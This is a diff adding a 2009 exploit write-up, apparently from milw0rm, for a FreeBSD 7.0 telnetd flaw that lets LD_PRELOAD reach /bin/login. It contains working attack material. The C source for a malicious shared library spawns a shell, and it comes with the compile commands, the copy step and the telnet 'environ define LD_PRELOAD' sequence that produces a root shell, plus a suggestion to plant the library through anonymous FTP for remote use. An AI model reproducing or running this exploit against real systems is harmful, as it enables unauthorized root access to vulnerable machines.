@@ -1,0 +1,82 @@
+FreeBSD (7.0-RELEASE) telnet daemon local privilege escalation -
+And possible remote root code excution.
+
+There is a rather big bug in the current FreeBSD telnetd daemon.
+The environment is not properly sanitized when execution /bin/login,
+what leads to a (possible) remote root hole.
+
+The telnet protocol allows to pass environment variables inside the 
+telnet traffic and assign them to the other side of the tcp connection.
+The telnet daemon of FreeBSD does not check for LD_* (like LD_PRELOAD)
+environment variables prior to executing /bin/login.
+So passing an environment variable with the identifier LD_PRELOAD and
+the value of a precompiled library that is on the filesystem of the
+victims box that includes malicious code is possible.
+When /bin/login is executed with the user id and group id 0 ('root') it preloads
+the library that was set by remote connection through a telnet environment
+definition and executes it.
+It is unlikely that this bug can be exploited remotely but is not impossible.
+An attacker could f.e. upload a malicious library using ftp (including anonymous
+ ftp users), nfs, smb or any other (file) transfer protocol. 
+One scenario to exploit the bug remotely would be a ftp server running beside 
+the telnet daemon serving also anoynmous users with write access. Then the
+attacker would upload the malicious library and defines the LD_PRELOAD
+variable to something similar to /var/ftp/mallib.so to gain remote root access.
+
+Here comes the actual exploit which can be executed with standard UNIX tools. 
+Paste this into a file using your favorite text editor:
+---snip-----
+# FreeBSD telnetd local/remote privilege escalation/code execution
+# remote root only when accessible ftp or similar available
+# tested on FreeBSD 7.0-RELEASE
+# by Kingcope/2009
+
+#include <unistd.h>
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+
+void _init() {
+        FILE *f;
+        setenv("LD_PRELOAD", "", 1);
+        system("echo ALEX-ALEX;/bin/sh");
+}
+---snip-----
+
+Then we compile this stuff.
+
+---snip-----
+#gcc -o program.o -c program.c -fPIC
+#gcc -shared -Wl,-soname,libno_ex.so.1 -o libno_ex.so.1.0 program.o -nostartfiles
+---snip-----
+
+Then we copy the file to a known location (local root exploit)
+
+---snip-----
+#cp libno_ex.so.1.0 /tmp/libno_ex.so.1.0
+---snip-----
+
+...or we upload the library through any other available attack vector.
+After that we telnet to the remote or local FreeBSD telnet daemon
+with setting the LD_PRELOAD environment variable to the known location
+as a telnet option before.
+
+---snip-----
+#telnet
+>auth disable SRA
+>environ define LD_PRELOAD /tmp/libno_ex.so.1.0
+>open target
+---snip-----
+ALEX-ALEX
+#ROOTSHELL
+
+This will give us an immediate (probably remote) root shell.
+This exploit is only verified on a FreeBSD 7.0-RELEASE fresh install
+with telnetd enabled. Other version of FreeBSD may also be affected,
+OpenBSD and NetBSD where not tested but MAY contain the same bug because
+of historic reasons.
+
+Signed,
+Kingcope[nikolaos rangos]/2009
+
+# milw0rm.com [2009-02-16]
